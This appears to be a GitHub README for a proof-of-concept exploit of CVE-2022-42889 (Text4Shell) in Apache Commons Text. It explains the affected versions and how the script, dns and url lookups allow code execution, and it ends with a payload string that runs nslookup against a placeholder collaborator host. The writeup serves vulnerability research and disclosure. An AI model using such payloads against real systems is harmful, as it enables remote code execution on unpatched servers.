# CVE-2022-42889-text4shell 🔥🔥🔥
Apache commons text  - CVE-2022-42889 Text4Shell proof of concept exploit.
## Details📃
CVE-2022-42889 affects Apache Commons Text versions 1.5 through 1.9. It has been patched as of Commons Text version 1.10


The vulnerability has been compared to Log4Shell since it is an open-source library-level vulnerability that is likely to impact a wide variety of software applications that use the relevant object.
However, initial analysis indicates that this is a bad comparison. The nature of the vulnerability means that unlike Log4Shell, it will be rare that an application uses the vulnerable component of Commons Text to process untrusted, potentially malicious input.
### Technical analysis
The vulnerability exists in the StringSubstitutor interpolator object. An interpolator is created by the StringSubstitutor.createInterpolator() method and will allow for string lookups as defined in the StringLookupFactory. This can be used by passing a string “${prefix:name}” where the prefix is the aforementioned lookup. Using the “script”, “dns”, or “url” lookups would allow a crafted string to execute arbitrary scripts when passed to the interpolator object.

While this specific code fragment is unlikely to exist in production applications, the concern is that in some applications, the `pocstring` variable may be attacker-controlled. In this sense, the vulnerability echoes Log4Shell. However, the StringSubstitutor interpolator is considerably less widely used than the vulnerable string substitution in Log4j and the nature of such an interpolator means that getting crafted input to the vulnerable object is less likely than merely interacting with such a crafted string as in Log4Shell.

**url**
```
${url:UTF-8:java.lang.Runtime.getRuntime().exec('nslookup COLLABORATOR-HERE')}
